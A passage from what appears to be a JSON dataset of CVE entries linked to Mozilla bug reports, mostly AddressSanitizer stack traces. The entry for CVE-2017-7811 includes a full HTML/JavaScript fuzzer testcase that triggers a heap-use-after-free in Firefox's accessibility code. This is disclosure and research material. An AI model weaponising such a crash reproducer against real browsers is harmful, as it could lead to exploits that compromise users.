in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #24 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #25 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #26 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #27 0x7f323a7c237f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #28 0x7f323ea50817 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #29 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #30 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #31 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #32 0x7f323ea5027d in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #33 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #34 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #35 0x7f325165e82f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 #36 0x41d168 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d168) 0x60d00005917c is located 28 bytes inside of 136-byte region [0x60d000059160,0x60d0000591e8) freed by thread T0 (Web Content) here: #0 0x4bb69b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f32340bbc47 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2661:25 #2 0x7f32340c2e0b in FreeSnowWhite /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2849:3 #3 0x7f32340c2e0b in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3851 #4 0x7f32340c2323 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3672:9 #5 0x7f32340c6100 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4209:21 #6 0x7f3236f9337d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1676:3 #7 0x7f3236ae145b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1409:3 #8 0x7f323423ee21 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7f3235b22fe0 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7f3235b22fe0 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7f3235b22fe0 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7f3235b2a05f in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:967:12 #13 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #14 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #15 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #16 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #17 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #18 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #19 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #20 0x7f323f894243 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2889:12 #21 0x7f3235a44a1b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #23 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #24 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #25 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #26 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #27 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #28 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #29 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #30 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #31 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #32 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #33 0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #34 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #35 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #36 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 #37 0x7f323afc4e6f in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1104:7 previously allocated by thread T0 (Web Content) here: #0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ecf0d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f3239075493 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f3239075493 in NS_NewHTMLSpanElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLSpanElement.cpp:15 #4 0x7f32390fda92 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:287:41 #5 0x7f32390fda92 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:258 #6 0x7f3236fc48c3 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:183:12 #7 0x7f3236eb23bb in nsDocument::CreateElem(nsAString const&, nsIAtom*, int, nsAString const*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8463:17 #8 0x7f323a8e6531 in mozilla::EditorBase::CreateHTMLContent(nsIAtom*) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:4720:15 #9 0x7f323a945bb8 in mozilla::HTMLEditor::CreateAnonymousElement(nsIAtom*, nsIDOMNode*, nsAString const&, bool) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:191:32 #10 0x7f323aa25f1c in CreateResizingInfo /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:210:5 #11 0x7f323aa25f1c in mozilla::HTMLEditor::ShowResizersInner(nsIDOMElement*) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:350 #12 0x7f323a9480ee in ShowResizers /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:283:17 #13 0x7f323a9480ee in mozilla::HTMLEditor::CheckSelectionStateForAnonymousButtons(nsISelection*) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:455 #14 0x7f323aa2185f in mozilla::ResizerSelectionListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:93:19 #15 0x7f3236d40356 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/dom/base/Selection.cpp:3764:15 #16 0x7f323b1ddfc0 in NotifySelectionListeners /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2069:23 #17 0x7f323b1ddfc0 in nsFrameSelection::EndBatchChanges(short) /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2057 #18 0x7f3236d40b56 in mozilla::dom::Selection::EndBatchChangesInternal(short) /home/worker/workspace/build/src/dom/base/Selection.cpp:3792:21 #19 0x7f3236d3bf1b in ~SelectionBatcher /home/worker/workspace/build/src/dom/base/Selection.h:484:19 #20 0x7f3236d3bf1b in mozilla::dom::Selection::SelectAllChildren(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3186 #21 0x7f3236d3c074 in mozilla::dom::Selection::SelectAllChildrenJS(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3169:3 #22 0x7f3237b86365 in mozilla::dom::SelectionBinding::selectAllChildren(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:719:9 #23 0x7f32389358a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3060:13 #24 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #25 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #26 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #27 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #28 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #29 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #30 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #31 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #32 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #33 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #34 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #35 0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #36 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #37 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #38 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c1a800031d0: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fd fd 0x0c1a800031e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1a800031f0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1a80003200: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c1a80003210: fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1a80003220: 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd[fd] 0x0c1a80003230: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a80003240: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 0x0c1a80003250: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 0x0c1a80003260: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80003270: fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==16173==ABORTING"
      }
    ],
    "CVE-2017-7811": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1392105%2C1395919%2C1388113%2C1348955%2C1394522%2C1387659%2C1369560%2C1388045%2C1378658%2C1379414%2C1385112%2C1367497",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170711160010). <script> function start() { fuzzPriv.enableAccessibility(); o1=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o2=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o4=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o5=window.document; o6=document.documentElement; document.documentElement.parentNode.removeChild(o6); o1.appendChild(o2); o22=window.getSelection(); o38=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o2.appendChild(o38); try{o5.designMode='on';}catch(e){} o4.style.position='absolute'; o5.write('<html><body><div></div><div></div></body></html>'); o4.prepend(o1,undefined); o106=document.createElementNS('http://www.w3.org/1999/xhtml','tr'); window.top.document.documentElement.appendChild(o4); o22.selectAllChildren(o38); window.top.document.documentElement.appendChild(o106); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==16173==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00005917c at pc 0x7f323e0d3825 bp 0x7fff23077f90 sp 0x7fff23077f88 READ of size 4 at 0x60d00005917c thread T0 (Web Content) #0 0x7f323e0d3824 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 #1 0x7f323e0d3824 in HasID /home/worker/workspace/build/src/dom/base/nsINode.h:1601 #2 0x7f323e0d3824 in mozilla::a11y::DocAccessible::RelocateARIAOwnedIfNeeded(nsIContent*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2043 #3 0x7f323e069e30 in mozilla::a11y::TreeWalker::AccessibleFor(nsIContent*, unsigned int, bool*) /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:321:15 #4 0x7f323e06a317 in mozilla::a11y::TreeWalker::Next() /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:175:27 #5 0x7f323e0dcd07 in mozilla::a11y::DocAccessible::CacheChildrenInSubtree(mozilla::a11y::Accessible*, mozilla::a11y::Accessible**) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2293:39 #6 0x7f323e0dc1cf in mozilla::a11y::DocAccessible::DoInitialUpdate() /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:1516:3 #7 0x7f323e04aa76 in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:627:16 #8 0x7f323ae61f77 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1854:12 #9 0x7f323ae71855 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:298:7 #10 0x7f323ae71524 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:320:5 #11 0x7f323ae73bbb in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:761:5 #12 0x7f323ae73bbb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:674 #13 0x7f323ae737c5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:575:9 #14 0x7f323b6a53e2 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #15 0x7f32355123c1 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #16 0x7f32350e3f2f in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1608:28 #17 0x7f323503018e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #18 0x7f323502d2d4 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #19 0x7f323502ebb4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #20 0x7f323502f198 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #21 0x7f323421f875 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1437:14 #22 0x7f3234225aa8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #23 0x7f3235037e41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #24 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #25 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #26 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #27 0x7f323a7c237f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #28 0x7f323ea50817 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #29 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #30 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #31 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #32 0x7f323ea5027d in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #33 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #34 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #35 0x7f325165e82f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 #36 0x41d168 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d168) 0x60d00005917c is located 28 bytes inside of 136-byte region [0x60d000059160,0x60d0000591e8) freed by thread T0 (Web Content) here: #0 0x4bb69b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f32340bbc47 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2661:25 #2 0x7f32340c2e0b in FreeSnowWhite /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2849:3 #3 0x7f32340c2e0b in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3851 #4 0x7f32340c2323 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3672:9 #5 0x7f32340c6100 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4209:21 #6 0x7f3236f9337d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1676:3 #7 0x7f3236ae145b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1409:3 #8 0x7f323423ee21 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7f3235b22fe0 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7f3235b22fe0 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7f3235b22fe0 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7f3235b2a05f in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:967:12 #13 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #14 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #15 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #16 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #17 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #18 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #19 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #20 0x7f323f894243 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2889:12 #21 0x7f3235a44a1b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #23 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #24 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #25 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #26 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #27 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #28 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #29 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #30 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #31 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #32 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #33 